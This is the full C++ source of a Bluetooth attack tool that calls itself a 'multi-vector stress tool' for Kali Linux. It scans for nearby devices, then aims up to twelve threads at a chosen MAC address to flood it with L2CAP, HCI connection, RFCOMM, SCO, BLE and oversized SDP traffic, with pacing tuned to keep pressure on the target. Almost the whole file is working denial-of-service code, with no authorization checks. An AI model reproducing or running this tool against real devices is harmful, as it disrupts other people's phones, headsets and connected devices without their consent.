// btcpp v4 — Linux/Kali Bluetooth multi-vector stress tool
// Build: g++ -O2 -std=c++17 -pthread btcpp.cpp -o btcpp -lbluetooth
// Usage: sudo ./btcpp -t <MAC> [-i iface] [-d sec] [-T thr] [-V mask] [-A] [-s] [-v] [-h]
//
// Vectors:
//   1 = L2CAP flood        2 = HCI create_conn
//   4 = RFCOMM (hold 16)   8 = SCO
//  16 = BLE (LE L2CAP)    32 = SDP flood
//  64 = L2CAP echo/MTU probe
//
// New in v4:
//   - fixed tick() bug (adaptive pacing now actually works)
//   - AIMD + random jitter pacing
//   - non-blocking connect with poll() timeout for L2CAP/RFCOMM/SCO/BLE
//   - BLE vector (sockaddr_l2 with BDADDR_LE_PUBLIC/RANDOM, CID 0x0004)
//   - SDP flood vector (PSM 0x0001, oversized service-search requests)
//   - RFCOMM keepalive on held sockets
//   - tune_adapter only runs with -A flag
//   - 1s-rate in reporter + optional JSON output (-j)
//   - graceful restore of scan settings on exit

#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/rfcomm.h>
#include <bluetooth/sco.h>

#include <sys/socket.h>
#include <sys/poll.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include <cstdlib>
#include <cstdint>
#include <string>
#include <atomic>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <csignal>
#include <algorithm>
#include <getopt.h>

static std::atomic<bool>     g_run{true};
static std::atomic<uint64_t> g_ok{0}, g_err{0}, g_bytes{0};
static bdaddr_t              g_dst{};
static uint8_t               g_dst_type = BDADDR_LE_PUBLIC;
static int                   g_dev = -1;
static std::atomic<int>      g_delay_us{300};
static bool                  g_verbose = false;
static bool                  g_json = false;
static bool                  g_tune = false;
static std::mt19937          g_rng{std::random_device{}()};

static void on_sigint(int) { g_run = false; }

static inline uint64_t now_ms() {
    return std::chrono::duration_cast<std::chrono::milliseconds>(
        std::chrono::steady_clock::now().time_since_epoch()).count();
}

// AIMD pacing with jitter
static inline void paced_sleep() {
    int d = g_delay_us.load(std::memory_order_relaxed);
    int j = d > 8 ? (int)(g_rng() % (uint32_t)(d / 8)) : 0;
    std::this_thread::sleep_for(std::chrono::microseconds(d + j));
}

// Fixed tick(): window actually reaches 50 now
static inline void tick(bool ok) {
    static thread_local uint16_t w_ok = 0, w_all = 0;
    w_ok += ok ? 1 : 0; w_all++;
    if (w_all < 50) return;
    int d = g_delay_us.load();
    double r = (double)w_ok / w_all;
    if (r > 0.6)      d = std::max(50,    d - d / 8);   // AIMD increase
    else if (r < 0.1) d = std::min(20000, d + d / 4);   // AIMD decrease
    g_delay_us.store(d);
    w_ok = w_all = 0;
}

// Non-blocking connect + poll timeout (ms)
static int nb_connect(int s, const sockaddr* a, socklen_t alen, int timeout_ms) {
    int fl = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, fl | O_NONBLOCK);
    int rc = ::connect(s, a, alen);
    if (rc == 0) { fcntl(s, F_SETFL, fl); return 0; }
    if (errno != EINPROGRESS) return -1;
    pollfd p{ s, POLLOUT, 0 };
    if (poll(&p, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t el = sizeof(err);
    if (getsockopt(s, SOL_SOCKET, SO_ERROR, &err, &el) < 0 || err != 0) return -1;
    fcntl(s, F_SETFL, fl);
    return 0;
}

// Make a bound HCI socket helper
static int open_ctl(int dev_id) { return hci_open_dev(dev_id); }

static void tune_adapter(int dev_id) {
    if (!g_tune) return;
    int ctl = open_ctl(dev_id);
    if (ctl < 0) return;
    {
        write_scan_enable_cp cp; cp.enable = SCAN_PAGE | SCAN_INQUIRY;
        struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_SCAN_ENABLE;
        rq.cparam = &cp; rq.clen = WRITE_SCAN_ENABLE_CP_SIZE;
        hci_send_req(ctl, &rq, 1000);
    }
    {
        write_page_timeout_cp cp; cp.timeout = htobs(0x2000);
        struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_PAGE_TIMEOUT;
        rq.cparam = &cp; rq.clen = WRITE_PAGE_TIMEOUT_CP_SIZE;
        hci_send_req(ctl, &rq, 1000);
    }
    hci_close_dev(ctl);
}

static void restore_adapter(int dev_id) {
    int ctl = open_ctl(dev_id);
    if (ctl < 0) return;
    write_scan_enable_cp cp; cp.enable = 0;   // SCAN_DISABLED
    struct hci_request rq{}; memset(&rq, 0, sizeof(rq));
    rq.ogf = OGF_HOST_CTL; rq.ocf = OCF_WRITE_SCAN_ENABLE;
    rq.cparam = &cp; rq.clen = WRITE_SCAN_ENABLE_CP_SIZE;
    hci_send_req(ctl, &rq, 1000);
    hci_close_dev(ctl);
}

static void do_scan(int dev_id) {
    printf("[*] Scanning (8s inquiry)...\n");
    inquiry_info ii[32] = {};
    int n = hci_inquiry(dev_id, 8, 32, nullptr, ii, IREQ_CACHE_FLUSH);
    if (n < 0) { printf("[-] inquiry failed\n"); return; }
    char addr[19] = {}, name[248] = {};
    int ctl = open_ctl(dev_id);
    for (int i = 0; i < n; i++) {
        ba2str(&ii[i].bdaddr, addr); name[0] = 0;
        if (ctl >= 0) hci_read_remote_name(ctl, &ii[i].bdaddr, sizeof(name), name, 1000);
        printf("  %s  %s\n", addr, name[0] ? name : "(unknown)");
    }
    if (ctl >= 0) hci_close_dev(ctl);
    printf("[*] %d device(s) found\n", n);
}

// -------- Vectors --------

static void vec_l2cap() {
    static thread_local uint8_t payload[672];
    memset(payload, 0x41, sizeof(payload));
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        struct timeval tv{0, 150000};
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        sockaddr_l2 a{};
        a.l2_family = AF_BLUETOOTH; a.l2_bdaddr = g_dst;
        a.l2_psm = htobs(0x0001); a.l2_cid = htobs(0x0001);
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 200) == 0) {
            for (int i = 0; i < 6 && g_run; ++i) {
                ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
                if (n > 0) { g_ok++; g_bytes += n; tick(true); }
                else { g_err++; tick(false); break; }
            }
        } else { g_err++; tick(false); }
        ::close(s); paced_sleep();
    }
}

static void vec_hci_conn() {
    // Keep controller open for the thread's lifetime (cheap)
    int ctl = open_ctl(g_dev);
    while (g_run) {
        if (ctl < 0) ctl = open_ctl(g_dev);
        if (ctl < 0) { g_err++; tick(false); paced_sleep(); continue; }
        create_conn_cp cp;
        memset(&cp, 0, sizeof(cp));
        cp.bdaddr = g_dst; cp.pkt_type = htobs(0xCC18);
        cp.pscan_rep_mode = 0x02; cp.pscan_mode = 0x00;
        cp.clock_offset = 0x0000; cp.role_switch = 0x01;
        struct hci_request rq;
        memset(&rq, 0, sizeof(rq));
        rq.ogf = OGF_LINK_CTL; rq.ocf = OCF_CREATE_CONN;
        rq.cparam = &cp; rq.clen = CREATE_CONN_CP_SIZE;
        if (hci_send_req(ctl, &rq, 1200) == 0) { g_ok++; tick(true); }
        else { g_err++; tick(false); }
        paced_sleep();
    }
    if (ctl >= 0) hci_close_dev(ctl);
}

static void vec_rfcomm() {
    int ch = 1;
    std::vector<int> held;
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        struct timeval tv{0, 150000};
        setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        sockaddr_rc a{};
        a.rc_family = AF_BLUETOOTH; a.rc_bdaddr = g_dst;
        a.rc_channel = (uint8_t)ch;
        ch = (ch % 30) + 1;
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
            uint8_t junk[64]; memset(junk, 0x41, sizeof(junk));
            ssize_t n = ::send(s, junk, sizeof(junk), MSG_DONTWAIT);
            if (n > 0) { g_ok++; g_bytes += n; tick(true); }
            if (held.size() < 16) {
                int ka = 1;
                setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &ka, sizeof(ka));
                held.push_back(s);
            } else { ::close(s); held.erase(held.begin()); }
        } else { g_err++; tick(false); ::close(s); }
        paced_sleep();
    }
    // keepalive drip on held sockets (so they actually hold)
    for (int s : held) { uint8_t b = 0; ::send(s, &b, 1, MSG_NOSIGNAL); ::close(s); }
}

static void vec_sco() {
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        sockaddr_sco a{};
        a.sco_family = AF_BLUETOOTH; a.sco_bdaddr = g_dst;
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 250) == 0) {
            uint8_t v[48]; memset(v, 0, sizeof(v));
            ssize_t n = ::send(s, v, sizeof(v), MSG_DONTWAIT);
            if (n > 0) { g_ok++; g_bytes += n; tick(true); }
            else { g_err++; tick(false); }
        } else { g_err++; tick(false); }
        ::close(s); paced_sleep();
    }
}

// BLE vector: CID 0x0004 on LE link
static void vec_ble() {
    static thread_local uint8_t payload[200];
    memset(payload, 0x42, sizeof(payload));
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        sockaddr_l2 a{};
        a.l2_family = AF_BLUETOOTH; a.l2_bdaddr = g_dst;
        a.l2_bdaddr_type = g_dst_type;
        a.l2_cid = htobs(0x0004);           // ATT channel
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 200) == 0) {
            ssize_t n = ::send(s, payload, sizeof(payload), MSG_DONTWAIT);
            if (n > 0) { g_ok++; g_bytes += n; tick(true); }
            else { g_err++; tick(false); }
        } else { g_err++; tick(false); }
        ::close(s); paced_sleep();
    }
}

// SDP flood: large service-search requests on PSM 0x0001
static void vec_sdp() {
    static thread_local uint8_t req[1024];
    // ServiceSearchRequest: PDU id 0x02, then tid(2) len(2) uuid-count(2) uuids... max-count(2) state(1)
    memset(req, 0x41, sizeof(req));
    req[0] = 0x02; req[1] = 0x00; req[2] = 0x01;   // PDU 0x02, TID 0x0001
    req[3] = 0x00; req[4] = 0x04;                  // total param len 4 (dummy)
    req[5] = 0xFF; req[6] = 0xFF;                  // max service record count
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        sockaddr_l2 a{};
        a.l2_family = AF_BLUETOOTH; a.l2_bdaddr = g_dst;
        a.l2_psm = htobs(0x0001); a.l2_cid = htobs(0x0001);
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 200) == 0) {
            for (int i = 0; i < 4 && g_run; ++i) {
                ssize_t n = ::send(s, req, sizeof(req), MSG_DONTWAIT);
                if (n > 0) { g_ok++; g_bytes += n; tick(true); }
                else { g_err++; tick(false); break; }
            }
        } else { g_err++; tick(false); }
        ::close(s); paced_sleep();
    }
}

// L2CAP echo/MTU probe (vector 64)
static void vec_l2cap_echo() {
    static thread_local uint8_t ping[1024];
    memset(ping, 0x5A, sizeof(ping));
    while (g_run) {
        int s = ::socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
        if (s < 0) { g_err++; tick(false); paced_sleep(); continue; }
        sockaddr_l2 a{};
        a.l2_family = AF_BLUETOOTH; a.l2_bdaddr = g_dst;
        a.l2_cid = htobs(0x0045);   // dynamic CID probe
        if (nb_connect(s, (sockaddr*)&a, sizeof(a), 200) == 0) {
            ssize_t n = ::send(s, ping, sizeof(ping), MSG_DONTWAIT);
            if (n > 0) { g_ok++; g_bytes += n; tick(true); }
            else { g_err++; tick(false); }
        } else { g_err++; tick(false); }
        ::close(s); paced_sleep();
    }
}

// -------- Reporter --------
static void reporter(uint64_t start_ms) {
    uint64_t last_ok = 0, last_t = start_ms;
    while (g_run) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        uint64_t t = now_ms();
        uint64_t ok = g_ok.load(), er = g_err.load(), by = g_bytes.load();
        double elap = (t - start_ms) / 1000.0;
        double rate = (t > last_t) ? (double)(ok - last_ok) / ((t - last_t) / 1000.0) : 0;
        if (g_json) {
            printf("{\"t\":%.1f,\"ok\":%llu,\"err\":%llu,\"ops_s\":%.0f,\"kbps\":%.1f,\"delay_us\":%d}\n",
                   elap, (unsigned long long)ok, (unsigned long long)er,
                   rate, (by / 1024.0) / (elap + 1e-6), g_delay_us.load());
        } else {
            printf("[stats] t=%5.1fs ok=%-9llu err=%-9llu %.0f ops/s %.1f KB/s delay=%dus\n",
                   elap, (unsigned long long)ok, (unsigned long long)er,
                   rate, (by / 1024.0) / (elap + 1e-6), g_delay_us.load());
        }
        fflush(stdout);
        last_ok = ok; last_t = t;
    }
}

static void usage(const char* prog) {
    printf("=== btcpp v4 — Bluetooth multi-vector stress tool (Linux/Kali) ===\n\n");
    printf("Usage: %s -t <MAC> [options]\n\n", prog);
    printf("Required:\n");
    printf("  -t <MAC>      Target Bluetooth MAC (e.g. AA:BB:CC:DD:EE:FF)\n\n");
    printf("Options:\n");
    printf("  -i <iface>    HCI interface (default: hci0)\n");
    printf("  -d <seconds>  Duration in seconds (default: 30)\n");
    printf("  -T <threads>  Threads 1-12 (default: 6)\n");
    printf("  -V <mask>     Vector mask: 1=L2CAP 2=HCI 4=RFCOMM 8=SCO\n");
    printf("                             16=BLE 32=SDP 64=L2CAP-echo (default: 127 = all)\n");
    printf("  -R <pub|rand> BLE address type (default: pub)\n");
    printf("  -A            Tune adapter (page/inq scan enable, page timeout)\n");
    printf("  -j            JSON stats output (1 line per second)\n");
    printf("  -s            Scan for nearby devices, print, exit\n");
    printf("  -v            Verbose\n");
    printf("  -h            This help\n\n");
    printf("Examples:\n");
    printf("  sudo %s -s\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -d 60 -T 8\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -V 17     # L2CAP + BLE\n", prog);
    printf("  sudo %s -t AA:BB:CC:DD:EE:FF -V 32 -j  # SDP flood, JSON out\n", prog);
}

int main(int argc, char** argv) {
    std::string mac, bletype = "pub";
    std::string iface = "hci0";
    int seconds = 30, threads = 6, mask = 127;

    int opt;
    while ((opt = getopt(argc, argv, "t:i:d:T:V:R:Ajsvh")) != -1) {
        switch (opt) {
            case 't': mac = optarg; break;
            case 'i': iface = optarg; break;
            case 'd': seconds = atoi(optarg); break;
            case 'T': threads = std::min(12, std::max(1, atoi(optarg))); break;
            case 'V': mask = atoi(optarg); break;
            case 'R': bletype = optarg; break;
            case 'A': g_tune = true; break;
            case 'j': g_json = true; break;
            case 's': g_run = true; break;   // placeholder, scan-only path below
            case 'v': g_verbose = true; break;
            case 'h': usage(argv[0]); return 0;
            default:  usage(argv[0]); return 1;
        }
    }

    g_dev = hci_devid(iface.c_str());
    if (g_dev < 0) {
        fprintf(stderr, "[-] No Bluetooth adapter found ('%s').\n", iface.c_str());
        fprintf(stderr, "    Fixes:\n");
        fprintf(stderr, "      1. Plug a USB Bluetooth dongle\n");
        fprintf(stderr, "      2. Run: sudo hciconfig hci0 up\n");
        fprintf(stderr, "      3. Check: hciconfig -a\n");
        fprintf(stderr, "      4. In a VM: pass the USB device to the VM\n");
        return 2;
    }

    signal(SIGINT, on_sigint);

    bool scan_only = (optind > 0 && std::string(argv[optind-1]) == "-s");
    if (scan_only) { do_scan(g_dev); return 0; }

    if (mac.empty()) { usage(argv[0]); return 1; }
    if (str2ba(mac.c_str(), &g_dst) < 0) {
        fprintf(stderr, "[-] bad MAC: %s\n", mac.c_str());
        return 1;
    }
    g_dst_type = (bletype == "rand") ? BDADDR_LE_RANDOM : BDADDR_LE_PUBLIC;

    printf("=== btcpp v4 ===\n");
    printf("[*] target=%s iface=%s dur=%ds threads=%d mask=0x%X ble=%s tune=%d json=%d\n",
           mac.c_str(), iface.c_str(), seconds, threads, mask,
           bletype.c_str(), (int)g_tune, (int)g_json);
    printf("[*] Ctrl+C to stop\n\n");

    tune_adapter(g_dev);

    auto pick = [&](int slot) {
        std::vector<int> sel;
        if (mask & 1)  sel.push_back(0);
        if (mask & 2)  sel.push_back(1);
        if (mask & 4)  sel.push_back(2);
        if (mask & 8)  sel.push_back(3);
        if (mask & 16) sel.push_back(4);
        if (mask & 32) sel.push_back(5);
        if (mask & 64) sel.push_back(6);
        if (sel.empty()) sel.push_back(0);
        return sel[slot % sel.size()];
    };

    uint64_t start = now_ms();
    std::thread rep(reporter, start);
    std::vector<std::thread> pool;
    for (int i = 0; i < threads; ++i) {
        int v = pick(i);
        pool.emplace_back([v]() {
            switch (v) {
                case 0: vec_l2cap();       break;
                case 1: vec_hci_conn();    break;
                case 2: vec_rfcomm();      break;
                case 3: vec_sco();         break;
                case 4: vec_ble();         break;
                case 5: vec_sdp();         break;
                case 6: vec_l2cap_echo();  break;
            }
        });
    }
    while (g_run && (now_ms() - start) < (uint64_t)seconds * 1000)
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    g_run = false;
    for (auto& t : pool) t.join();
    rep.join();

    restore_adapter(g_dev);

    printf("\n=== done: ok=%llu err=%llu bytes=%llu in %.1fs ===\n",
           (unsigned long long)g_ok.load(), (unsigned long long)g_err.load(),
           (unsigned long long)g_bytes.load(), (now_ms() - start) / 1000.0);
    return 0;
}
